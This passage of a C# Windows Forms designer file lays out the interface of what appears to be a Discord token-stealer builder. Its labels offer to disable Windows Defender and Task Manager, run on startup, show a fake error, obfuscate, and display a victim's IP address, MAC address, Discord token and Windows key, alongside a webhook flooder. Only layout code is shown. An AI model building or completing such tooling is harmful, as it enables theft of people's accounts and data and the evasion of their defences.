            this.bsodBox.AutoSize = true;
            this.bsodBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.bsodBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.bsodBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.bsodBox.ForeColor = System.Drawing.Color.DarkRed;
            this.bsodBox.Location = new System.Drawing.Point(46, 193);
            this.bsodBox.Name = "bsodBox";
            this.bsodBox.Size = new System.Drawing.Size(90, 19);
            this.bsodBox.TabIndex = 5;
            this.bsodBox.Text = "Blue Screen";
            this.bsodBox.UseVisualStyleBackColor = true;
            // 
            // taskmanagerBox
            // 
            this.taskmanagerBox.AutoSize = true;
            this.taskmanagerBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.taskmanagerBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.taskmanagerBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.taskmanagerBox.ForeColor = System.Drawing.Color.DarkRed;
            this.taskmanagerBox.Location = new System.Drawing.Point(46, 166);
            this.taskmanagerBox.Name = "taskmanagerBox";
            this.taskmanagerBox.Size = new System.Drawing.Size(147, 19);
            this.taskmanagerBox.TabIndex = 5;
            this.taskmanagerBox.Text = "Disable Task Manager";
            this.taskmanagerBox.UseVisualStyleBackColor = true;
            // 
            // defenderBox
            // 
            this.defenderBox.AutoSize = true;
            this.defenderBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.defenderBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.defenderBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.defenderBox.ForeColor = System.Drawing.Color.DarkRed;
            this.defenderBox.Location = new System.Drawing.Point(46, 139);
            this.defenderBox.Name = "defenderBox";
            this.defenderBox.Size = new System.Drawing.Size(172, 19);
            this.defenderBox.TabIndex = 5;
            this.defenderBox.Text = "Disable Windows Defender";
            this.defenderBox.UseVisualStyleBackColor = true;
            // 
            // startupBox
            // 
            this.startupBox.AutoSize = true;
            this.startupBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.startupBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.startupBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.startupBox.ForeColor = System.Drawing.Color.DarkRed;
            this.startupBox.Location = new System.Drawing.Point(46, 113);
            this.startupBox.Name = "startupBox";
            this.startupBox.Size = new System.Drawing.Size(103, 19);
            this.startupBox.TabIndex = 5;
            this.startupBox.Text = "Run on startup";
            this.startupBox.UseVisualStyleBackColor = true;
            // 
            // errorBox
            // 
            this.errorBox.AutoSize = true;
            this.errorBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.errorBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.errorBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.errorBox.ForeColor = System.Drawing.Color.DarkRed;
            this.errorBox.Location = new System.Drawing.Point(46, 86);
            this.errorBox.Name = "errorBox";
            this.errorBox.Size = new System.Drawing.Size(79, 19);
            this.errorBox.TabIndex = 5;
            this.errorBox.Text = "Fake error";
            this.errorBox.UseVisualStyleBackColor = true;
            // 
            // obfuscateBox
            // 
            this.obfuscateBox.AutoSize = true;
            this.obfuscateBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.obfuscateBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.obfuscateBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.obfuscateBox.ForeColor = System.Drawing.Color.DarkRed;
            this.obfuscateBox.Location = new System.Drawing.Point(46, 59);
            this.obfuscateBox.Name = "obfuscateBox";
            this.obfuscateBox.Size = new System.Drawing.Size(78, 19);
            this.obfuscateBox.TabIndex = 4;
            this.obfuscateBox.Text = "Obfuscate";
            this.obfuscateBox.UseVisualStyleBackColor = true;
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label17.ForeColor = System.Drawing.Color.DarkRed;
            this.label17.Location = new System.Drawing.Point(32, 32);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(139, 20);
            this.label17.TabIndex = 3;
            this.label17.Text = "Additional settings";
            // 
            // tokenBox
            // 
            this.tokenBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.tokenBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.tokenBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tokenBox.ForeColor = System.Drawing.Color.DarkRed;
            this.tokenBox.Location = new System.Drawing.Point(200, 252);
            this.tokenBox.Name = "tokenBox";
            this.tokenBox.ReadOnly = true;
            this.tokenBox.Size = new System.Drawing.Size(381, 19);
            this.tokenBox.TabIndex = 10;
            // 
            // macBox
            // 
            this.macBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.macBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.macBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.macBox.ForeColor = System.Drawing.Color.DarkRed;
            this.macBox.Location = new System.Drawing.Point(232, 211);
            this.macBox.Name = "macBox";
            this.macBox.ReadOnly = true;
            this.macBox.Size = new System.Drawing.Size(349, 19);
            this.macBox.TabIndex = 10;
            // 
            // ipBox
            // 
            this.ipBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.ipBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.ipBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.ipBox.ForeColor = System.Drawing.Color.DarkRed;
            this.ipBox.Location = new System.Drawing.Point(208, 174);
            this.ipBox.Name = "ipBox";
            this.ipBox.ReadOnly = true;
            this.ipBox.Size = new System.Drawing.Size(373, 19);
            this.ipBox.TabIndex = 10;
            // 
            // nameBox
            // 
            this.nameBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.nameBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.nameBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.nameBox.ForeColor = System.Drawing.Color.DarkRed;
            this.nameBox.Location = new System.Drawing.Point(174, 136);
            this.nameBox.Name = "nameBox";
            this.nameBox.ReadOnly = true;
            this.nameBox.Size = new System.Drawing.Size(407, 19);
            this.nameBox.TabIndex = 9;
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label15.ForeColor = System.Drawing.Color.DarkRed;
            this.label15.Location = new System.Drawing.Point(92, 293);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(74, 20);
            this.label15.TabIndex = 8;
            this.label15.Text = "WIN Key:";
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label13.ForeColor = System.Drawing.Color.DarkRed;
            this.label13.Location = new System.Drawing.Point(92, 252);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(84, 20);
            this.label13.TabIndex = 7;
            this.label13.Text = "DC Token:";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label12.ForeColor = System.Drawing.Color.DarkRed;
            this.label12.Location = new System.Drawing.Point(92, 211);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(111, 20);
            this.label12.TabIndex = 6;
            this.label12.Text = "MAC Address:";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label11.ForeColor = System.Drawing.Color.DarkRed;
            this.label11.Location = new System.Drawing.Point(92, 173);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(91, 20);
            this.label11.TabIndex = 5;
            this.label11.Text = "IP Address:";
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label10.ForeColor = System.Drawing.Color.DarkRed;
            this.label10.Location = new System.Drawing.Point(92, 135);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(55, 20);
            this.label10.TabIndex = 4;
            this.label10.Text = "Name:";
            // 
            // dAIOupload
            // 
            this.dAIOupload.Cursor = System.Windows.Forms.Cursors.Hand;
            this.dAIOupload.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.dAIOupload.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.dAIOupload.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.dAIOupload.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.dAIOupload.ForeColor = System.Drawing.Color.DarkRed;
            this.dAIOupload.Location = new System.Drawing.Point(542, 67);
            this.dAIOupload.Name = "dAIOupload";
            this.dAIOupload.Size = new System.Drawing.Size(83, 24);
            this.dAIOupload.TabIndex = 3;
            this.dAIOupload.Text = "Upload";
            this.dAIOupload.UseVisualStyleBackColor = true;
            this.dAIOupload.Click += new System.EventHandler(this.dAIOupload_Click);
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label14.ForeColor = System.Drawing.Color.DarkRed;
            this.label14.Location = new System.Drawing.Point(35, 39);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(50, 20);
            this.label14.TabIndex = 2;
            this.label14.Text = ".dAIO";
            // 
            // dAIObox
            // 
            this.dAIObox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.dAIObox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.dAIObox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.dAIObox.ForeColor = System.Drawing.Color.DarkRed;
            this.dAIObox.Location = new System.Drawing.Point(37, 67);
            this.dAIObox.Name = "dAIObox";
            this.dAIObox.ReadOnly = true;
            this.dAIObox.Size = new System.Drawing.Size(499, 19);
            this.dAIObox.TabIndex = 1;
            // 
            // pumpBox
            // 
            this.pumpBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.pumpBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.pumpBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.pumpBox.ForeColor = System.Drawing.Color.DarkRed;
            this.pumpBox.Location = new System.Drawing.Point(37, 67);
            this.pumpBox.Name = "pumpBox";
            this.pumpBox.Size = new System.Drawing.Size(118, 19);
            this.pumpBox.TabIndex = 1;
            // 
            // label28
            // 
            this.label28.AutoSize = true;
            this.label28.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label28.ForeColor = System.Drawing.Color.DarkRed;
            this.label28.Location = new System.Drawing.Point(35, 39);
            this.label28.Name = "label28";
            this.label28.Size = new System.Drawing.Size(92, 20);
            this.label28.TabIndex = 2;
            this.label28.Text = "File pumper";
            // 
            // pumpButton
            // 
            this.pumpButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pumpButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.pumpButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.pumpButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.pumpButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.pumpButton.ForeColor = System.Drawing.Color.DarkRed;
            this.pumpButton.Location = new System.Drawing.Point(542, 67);
            this.pumpButton.Name = "pumpButton";
            this.pumpButton.Size = new System.Drawing.Size(83, 24);
            this.pumpButton.TabIndex = 3;
            this.pumpButton.Text = "Pump";
            this.pumpButton.UseVisualStyleBackColor = true;
            this.pumpButton.Click += new System.EventHandler(this.pumpButton_Click);
            // 
            // miscSite
            // 
            this.miscSite.Controls.Add(this.tVLabel);
            this.miscSite.Controls.Add(this.tMFALabel);
            this.miscSite.Controls.Add(this.tIDLabel);
            this.miscSite.Controls.Add(this.tPhoneLabel);
            this.miscSite.Controls.Add(this.tEmailLabel);
            this.miscSite.Controls.Add(this.tNameLabel);
            this.miscSite.Controls.Add(this.avatarBox);
            this.miscSite.Controls.Add(this.button8);
            this.miscSite.Controls.Add(this.label36);
            this.miscSite.Controls.Add(this.label35);
            this.miscSite.Controls.Add(this.label34);
            this.miscSite.Controls.Add(this.label33);
            this.miscSite.Controls.Add(this.label32);
            this.miscSite.Controls.Add(this.label31);
            this.miscSite.Controls.Add(this.label30);
            this.miscSite.Controls.Add(this.flooderEmbed);
            this.miscSite.Controls.Add(this.flooderEmSelect);
            this.miscSite.Controls.Add(this.label27);
            this.miscSite.Controls.Add(this.safeBox);
            this.miscSite.Controls.Add(this.label26);
            this.miscSite.Controls.Add(this.wdeleteButton);
            this.miscSite.Controls.Add(this.label25);
            this.miscSite.Controls.Add(this.label24);
            this.miscSite.Controls.Add(this.textBox2);
            this.miscSite.Controls.Add(this.label23);
            this.miscSite.Controls.Add(this.userBox);
            this.miscSite.Controls.Add(this.tokenChecker);
            this.miscSite.Controls.Add(this.label29);
            this.miscSite.Controls.Add(this.button4);
            this.miscSite.Controls.Add(this.TokenCheckerBox);
            this.miscSite.Controls.Add(this.label22);
            this.miscSite.Controls.Add(this.miscWebhookBox);
            this.miscSite.Controls.Add(this.gbBox);
            this.miscSite.Controls.Add(this.mbBox);
            this.miscSite.Controls.Add(this.kbBox);
            this.miscSite.Controls.Add(this.pumpButton);
            this.miscSite.Controls.Add(this.label28);
            this.miscSite.Controls.Add(this.pumpPathBox);
            this.miscSite.Controls.Add(this.pumpBox);
            this.miscSite.Location = new System.Drawing.Point(1073, 60);
            this.miscSite.Name = "miscSite";
            this.miscSite.Size = new System.Drawing.Size(751, 522);
            this.miscSite.TabIndex = 17;
            // 
            // tVLabel
            // 
            this.tVLabel.AutoSize = true;
            this.tVLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tVLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.tVLabel.Location = new System.Drawing.Point(497, 349);
            this.tVLabel.Name = "tVLabel";
            this.tVLabel.Size = new System.Drawing.Size(51, 20);
            this.tVLabel.TabIndex = 37;
            this.tVLabel.Text = "None";
            // 
            // tMFALabel
            // 
            this.tMFALabel.AutoSize = true;
            this.tMFALabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tMFALabel.ForeColor = System.Drawing.Color.DarkRed;
            this.tMFALabel.Location = new System.Drawing.Point(469, 316);
            this.tMFALabel.Name = "tMFALabel";
            this.tMFALabel.Size = new System.Drawing.Size(51, 20);
            this.tMFALabel.TabIndex = 36;
            this.tMFALabel.Text = "None";
            // 
            // tIDLabel
            // 
            this.tIDLabel.AutoSize = true;
            this.tIDLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tIDLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.tIDLabel.Location = new System.Drawing.Point(451, 283);
            this.tIDLabel.Name = "tIDLabel";
            this.tIDLabel.Size = new System.Drawing.Size(51, 20);
            this.tIDLabel.TabIndex = 35;
            this.tIDLabel.Text = "None";
            // 
            // tPhoneLabel
            // 
            this.tPhoneLabel.AutoSize = true;
            this.tPhoneLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tPhoneLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.tPhoneLabel.Location = new System.Drawing.Point(485, 250);
            this.tPhoneLabel.Name = "tPhoneLabel";
            this.tPhoneLabel.Size = new System.Drawing.Size(51, 20);
            this.tPhoneLabel.TabIndex = 34;
            this.tPhoneLabel.Text = "None";
            // 
            // tEmailLabel
            // 
            this.tEmailLabel.AutoSize = true;
            this.tEmailLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tEmailLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.tEmailLabel.Location = new System.Drawing.Point(488, 217);
            this.tEmailLabel.Name = "tEmailLabel";
            this.tEmailLabel.Size = new System.Drawing.Size(51, 20);
            this.tEmailLabel.TabIndex = 33;
            this.tEmailLabel.Text = "None";
            // 
            // tNameLabel
            // 
            this.tNameLabel.AutoSize = true;
            this.tNameLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.tNameLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.tNameLabel.Location = new System.Drawing.Point(484, 184);
            this.tNameLabel.Name = "tNameLabel";
            this.tNameLabel.Size = new System.Drawing.Size(51, 20);
            this.tNameLabel.TabIndex = 32;
            this.tNameLabel.Text = "None";
            // 
            // avatarBox
            // 
            this.avatarBox.Location = new System.Drawing.Point(647, 297);
            this.avatarBox.Name = "avatarBox";
            this.avatarBox.Size = new System.Drawing.Size(80, 80);
            this.avatarBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.avatarBox.TabIndex = 31;
            this.avatarBox.TabStop = false;
            // 
            // button8
            // 
            this.button8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button8.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button8.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button8.ForeColor = System.Drawing.Color.DarkRed;
            this.button8.Location = new System.Drawing.Point(532, 466);
            this.button8.Name = "button8";
            this.button8.Size = new System.Drawing.Size(83, 24);
            this.button8.TabIndex = 30;
            this.button8.Text = "Delete";
            this.button8.UseVisualStyleBackColor = true;
            this.button8.Click += new System.EventHandler(this.button8_Click);
            // 
            // label36
            // 
            this.label36.AutoSize = true;
            this.label36.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label36.ForeColor = System.Drawing.Color.DarkRed;
            this.label36.Location = new System.Drawing.Point(415, 466);
            this.label36.Name = "label36";
            this.label36.Size = new System.Drawing.Size(100, 20);
            this.label36.TabIndex = 29;
            this.label36.Text = "Delete token";
            // 
            // label35
            // 
            this.label35.AutoSize = true;
            this.label35.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label35.ForeColor = System.Drawing.Color.DarkRed;
            this.label35.Location = new System.Drawing.Point(415, 349);
            this.label35.Name = "label35";
            this.label35.Size = new System.Drawing.Size(67, 20);
            this.label35.TabIndex = 28;
            this.label35.Text = "Verified:";
            // 
            // label34
            // 
            this.label34.AutoSize = true;
            this.label34.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label34.ForeColor = System.Drawing.Color.DarkRed;
            this.label34.Location = new System.Drawing.Point(415, 316);
            this.label34.Name = "label34";
            this.label34.Size = new System.Drawing.Size(47, 20);
            this.label34.TabIndex = 27;
            this.label34.Text = "MFA:";
            // 
            // label33
            // 
            this.label33.AutoSize = true;
            this.label33.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label33.ForeColor = System.Drawing.Color.DarkRed;
            this.label33.Location = new System.Drawing.Point(415, 283);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(30, 20);
            this.label33.TabIndex = 28;
            this.label33.Text = "ID:";
            // 
            // label32
            // 
            this.label32.AutoSize = true;
            this.label32.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label32.ForeColor = System.Drawing.Color.DarkRed;
            this.label32.Location = new System.Drawing.Point(415, 250);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(59, 20);
            this.label32.TabIndex = 27;
            this.label32.Text = "Phone:";
            // 
            // label31
            // 
            this.label31.AutoSize = true;
            this.label31.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label31.ForeColor = System.Drawing.Color.DarkRed;
            this.label31.Location = new System.Drawing.Point(415, 217);
            this.label31.Name = "label31";
            this.label31.Size = new System.Drawing.Size(57, 20);
            this.label31.TabIndex = 28;
            this.label31.Text = "E-mail:";
            // 
            // label30
            // 
            this.label30.AutoSize = true;
            this.label30.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label30.ForeColor = System.Drawing.Color.DarkRed;
            this.label30.Location = new System.Drawing.Point(415, 184);
            this.label30.Name = "label30";
            this.label30.Size = new System.Drawing.Size(55, 20);
            this.label30.TabIndex = 27;
            this.label30.Text = "Name:";
            // 
            // flooderEmbed
            // 
            this.flooderEmbed.BackColor = System.Drawing.Color.Lime;
            this.flooderEmbed.Location = new System.Drawing.Point(214, 346);
            this.flooderEmbed.Name = "flooderEmbed";
            this.flooderEmbed.Size = new System.Drawing.Size(27, 27);
            this.flooderEmbed.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.flooderEmbed.TabIndex = 26;
            this.flooderEmbed.TabStop = false;
            // 
            // flooderEmSelect
            // 
            this.flooderEmSelect.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flooderEmSelect.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.flooderEmSelect.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.flooderEmSelect.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.flooderEmSelect.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.flooderEmSelect.ForeColor = System.Drawing.Color.DarkRed;
            this.flooderEmSelect.Location = new System.Drawing.Point(247, 348);
            this.flooderEmSelect.Name = "flooderEmSelect";
            this.flooderEmSelect.Size = new System.Drawing.Size(83, 24);
            this.flooderEmSelect.TabIndex = 25;
            this.flooderEmSelect.Text = "Select";
            this.flooderEmSelect.UseVisualStyleBackColor = true;
            this.flooderEmSelect.Click += new System.EventHandler(this.flooderEmSelect_Click);
            // 
            // label27
            // 
            this.label27.AutoSize = true;
            this.label27.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label27.ForeColor = System.Drawing.Color.DarkRed;
            this.label27.Location = new System.Drawing.Point(35, 347);
            this.label27.Name = "label27";
            this.label27.Size = new System.Drawing.Size(154, 20);
            this.label27.TabIndex = 24;
            this.label27.Text = "Flooder embed color";
            // 
            // safeBox
            // 
            this.safeBox.AutoSize = true;
            this.safeBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.safeBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.safeBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.safeBox.ForeColor = System.Drawing.Color.DarkRed;
            this.safeBox.Location = new System.Drawing.Point(59, 421);
            this.safeBox.Name = "safeBox";
            this.safeBox.Size = new System.Drawing.Size(83, 19);
            this.safeBox.TabIndex = 23;
            this.safeBox.Text = "Safe mode";
            this.safeBox.UseVisualStyleBackColor = true;
            // 
            // label26
            // 
            this.label26.AutoSize = true;
            this.label26.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label26.ForeColor = System.Drawing.Color.DarkRed;
            this.label26.Location = new System.Drawing.Point(35, 402);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(130, 20);
            this.label26.TabIndex = 20;
            this.label26.Text = "Webhook flooder";
            // 
            // wdeleteButton
            // 
            this.wdeleteButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.wdeleteButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.wdeleteButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.wdeleteButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.wdeleteButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.wdeleteButton.ForeColor = System.Drawing.Color.DarkRed;
            this.wdeleteButton.Location = new System.Drawing.Point(180, 467);
            this.wdeleteButton.Name = "wdeleteButton";
            this.wdeleteButton.Size = new System.Drawing.Size(83, 24);
            this.wdeleteButton.TabIndex = 19;
            this.wdeleteButton.Text = "Delete";
            this.wdeleteButton.UseVisualStyleBackColor = true;
            this.wdeleteButton.Click += new System.EventHandler(this.wdeleteButton_Click);
            // 
            // label25
            // 
            this.label25.AutoSize = true;
            this.label25.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label25.ForeColor = System.Drawing.Color.DarkRed;
            this.label25.Location = new System.Drawing.Point(35, 466);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(124, 20);
            this.label25.TabIndex = 18;
            this.label25.Text = "Delete webhook";
            // 
            // label24
            // 
            this.label24.AutoSize = true;
            this.label24.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label24.ForeColor = System.Drawing.Color.DarkRed;
            this.label24.Location = new System.Drawing.Point(35, 277);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(74, 20);
            this.label24.TabIndex = 17;
            this.label24.Text = "Message";
            // 
            // textBox2
            // 
            this.textBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.textBox2.BorderStyle = System.Windows.Forms.BorderStyle.None;
